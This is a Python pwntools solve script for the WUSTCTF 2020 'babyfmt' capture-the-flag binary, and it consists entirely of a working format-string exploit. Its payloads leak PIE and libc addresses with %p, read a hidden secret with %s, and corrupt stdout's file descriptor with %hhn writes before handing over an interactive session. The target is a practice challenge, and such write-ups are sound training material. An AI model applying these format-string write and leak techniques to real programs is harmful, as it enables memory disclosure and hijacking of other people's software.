#!/usr/bin/env python3
"""WUSTCTF 2020 babyfmt; adapted to the bundled ELF, no remote endpoint by default.
Reference: https://github.com/Yeuoly/buuctf_pwn/tree/master/wustctf2020_babyfmt
Requires a matching Ubuntu 16.04 amd64 libc 2.23: LIBC=/path/to/libc.so.6 python3 solve.py
Use REMOTE=1 HOST=... PORT=... only for an authorized challenge instance.
"""
from pathlib import Path
from pwn import *

HERE = Path(__file__).resolve().parent
context.arch = "amd64"
elf = ELF(str(HERE / "wustctf2020_babyfmt"), checksec=False)
libc_path = args.LIBC or str(HERE / "libc.so.6")
if not Path(libc_path).is_file():
    raise SystemExit("Provide the matching libc with LIBC=/path/to/libc.so.6")
libc = ELF(libc_path, checksec=False)
io = remote(args.HOST, int(args.PORT)) if args.REMOTE else process(str(elf.path))

def recv_hex(count):
    data = io.recvn(count)
    return int(data, 16)

io.sendlineafter(b"time", b"aaa")
io.sendlineafter(b">>", b"2")
io.sendline(b"%7$hhnaaaa%17$p,,,%23$p")
io.recvuntil(b"aaaa")
pie = recv_hex(14) - elf.sym["main"] - 118
secret_addr = pie + 0x202060
io.recvuntil(b",,,")
libc_base = recv_hex(14) - libc.sym["__libc_start_main"] - 240
log.info("PIE base: %#x", pie)
log.info("libc base: %#x", libc_base)

io.sendlineafter(b">>", b"2")
io.sendline(b"%7$hhnaaaaa%10$s" + p64(secret_addr))
io.recvuntil(b"aaaaa")
secret = io.recvn(0x40)

io.sendlineafter(b">>", b"2")
stdout_fileno = libc_base + libc.sym["_IO_2_1_stdout_"] + 112
io.sendline(b"aa%9$hhn" + p64(stdout_fileno))
io.sendlineafter(b">>", b"3")
io.sendafter(b"door!", secret)
io.interactive()
